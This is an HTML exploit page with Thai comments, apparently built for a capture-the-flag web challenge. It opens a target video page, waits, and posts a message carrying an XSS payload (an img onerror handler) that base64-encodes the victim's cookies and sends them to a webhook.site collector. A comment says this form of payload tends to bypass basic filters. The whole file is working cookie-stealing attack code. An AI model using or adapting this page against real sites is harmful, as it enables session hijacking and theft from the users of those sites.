<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Exploit Page</title>

<body>
    <h1>Processing... Please wait</h1>
    <script>
        // เปลี่ยน URL ตรงนี้เป็น URL ของโจทย์
        const targetUrl = "http://34.87.93.26:3000/video.html?v=featured";
        // Webhook URL ของคุณ
        const webhook = "https://webhook.site/c8b5eb75-9989-4b28-8dfa-6b11ee60562f";

        // 1. เปิดหน้าต่างใหม่ไปยังหน้าเว็บของเหยื่อ (VlogStar)
        const victimWin = window.open(targetUrl);

        // 2. รอให้หน้าเว็บโหลดเสร็จ (ประมาณ 3-5 วินาที) แล้วส่ง Payload
        setTimeout(() => {
            if (victimWin) {
                // สร้าง Payload เพื่อดึง Cookie และส่งไปยัง Webhook
                // ใช้ <img> tag ที่มี onerror เพราะมักจะ bypass filter พื้นฐานได้ดี
                const payload = {
                    type: "overlay-update",
                    content: `<img src=x onerror="fetch('${webhook}?cookie=' + btoa(document.cookie))">`
                };

                // 3. ส่ง message ไปยังหน้าต่างของเหยื่อ
                victimWin.postMessage(payload, "*");
                console.log("Payload sent!");
            }
        }, 4000); 
    </script>
